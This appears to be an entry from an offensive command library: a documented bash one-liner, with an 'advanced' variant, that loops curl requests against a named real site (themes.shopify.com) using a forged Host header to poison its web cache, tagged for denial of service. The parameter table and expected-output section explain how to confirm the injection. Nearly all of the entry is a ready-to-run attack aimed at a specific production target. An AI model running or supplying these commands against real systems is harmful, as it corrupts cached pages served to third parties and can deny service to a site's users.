---
data: >-
  while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H
  "Host: themes.shopify.com:1337" | grep ":1337"; sleep 0; echo 1; done
tags:
  - web-cache-poisoning
  - dos
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: fb2211f6-1885-47bd-bd2b-eedd209069c1
created_at: '2025-12-14T17:26:55.899Z'
updated_at: '2025-12-14T17:26:55.899Z'
verified: false
validated: true
submitted: true
---
# curl-poison-host-header

## Command

```bash
while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337" | grep ":1337"; sleep 0; echo 1; done
```

## Description

This command runs an infinite loop to poison a web cache by sending HTTPS requests with a custom Host header appending an invalid port (:1337), targeting a cacheable endpoint, and filtering output for confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-ik` | Include response headers (-i) and insecure SSL handling (-k) | Yes |
| `-H "Host: themes.shopify.com:1337"` | Override Host header with poisoned value | Yes |
| `https://themes.shopify.com:443/?g4mm4=hitthecache` | Target URL with cache parameter | Yes |
| `| grep ":1337"` | Filter output for poison indicator | Yes |
| `sleep 0; echo 1` | Minimal pause and loop marker | No |

## Examples

### Basic Usage

```bash
while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337" | grep ":1337"; sleep 0; echo 1; done
```

### Advanced Usage

```bash
while true; do curl -ik -v "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337" -H "Accept-Encoding: gzip" | gunzip | grep ":1337"; sleep 1; done
```

## Expected Output

Responses containing ':1337', such as <link rel='canonical' href='https://themes.shopify.com:1337/?g4mm4=hitthecache'> or similar poisoned elements, confirming cache injection.

## Related

- [[Related Procedure: Poison-Web-Cache-with-Modified-Host-Header]]
